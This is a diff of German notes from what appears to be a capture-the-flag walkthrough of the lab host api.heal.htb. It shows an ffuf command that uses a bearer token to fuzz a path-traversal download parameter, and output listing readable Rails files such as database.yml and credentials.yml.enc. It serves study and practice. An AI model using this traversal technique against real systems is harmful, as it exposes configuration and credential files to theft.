@@ -805,13 +805,11 @@ ruby-paths.txt
 /db/schema.sql
 ```
 
-3. Mit ```ffuf``` (https://github.com/ffuf/ffuf) die Liste angewendet
-```
-ffuf  -u http://api.heal.htb/download?filename=../../FUZZ 
-      -w ruby-paths.txt 
-      -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE" 
-      -mc 200
-```
+3. Manuell ```/app/controllers/application_controller.rb``` getestet 
+und den pfad nach oben gegangen bis es bei ```../../app/controllers/application_controller.rb```
+geklappt hat
+
+5. Jetzt mit ```ffuf``` (https://github.com/ffuf/ffuf) die Liste anwenden und schauen welche es gibt
 ```
 Description:
 
@@ -820,5 +818,41 @@ ffuf  -u = HOST
       -H = HEADER
       -mc= MATCH STATUS CODE
 ```
+
 ![fuzzing-ruby-api-subdomain.png](../../../img/fuzzing-ruby-api-subdomain.png)
+
+```
+ffuf  -u http://api.heal.htb/download?filename=../../FUZZ 
+      -w ruby-paths.txt 
+      -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE" 
+      -mc 200
+```
+
+```
+Result/Accessible:
+
+/config/environments/test.rb                        [Status: 200, Size: 2643, Words: 348, Lines: 65, Duration: 37ms]
+/config/initializers/filter_parameter_logging.rb    [Status: 200, Size: 448, Words: 57, Lines: 9, Duration: 231ms]
+/config/initializers/cors.rb                        [Status: 200, Size: 500, Words: 77, Lines: 17, Duration: 332ms]
+/config/cable.yml                                   [Status: 200, Size: 191, Words: 21, Lines: 11, Duration: 729ms]
+/app/models/user.rb                                 [Status: 200, Size: 328, Words: 45, Lines: 16, Duration: 835ms]
+/app/controllers/application_controller.rb          [Status: 200, Size: 56, Words: 4, Lines: 3, Duration: 929ms]
+/config/environments/production.rb                  [Status: 200, Size: 4090, Words: 594, Lines: 91, Duration: 1032ms]
+/config/database.yml                                [Status: 200, Size: 636, Words: 93, Lines: 26, Duration: 1130ms]
+/config/credentials.yml.enc                         [Status: 200, Size: 456, Words: 1, Lines: 1, Duration: 1232ms]
+/config/environments/development.rb                 [Status: 200, Size: 2513, Words: 339, Lines: 74, Duration: 1330ms]
+:: Progress: [34/34] :: Job [1/1] :: 16 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+```
+
 ---
+
+
+
+
+
+
+
+
+
+
+
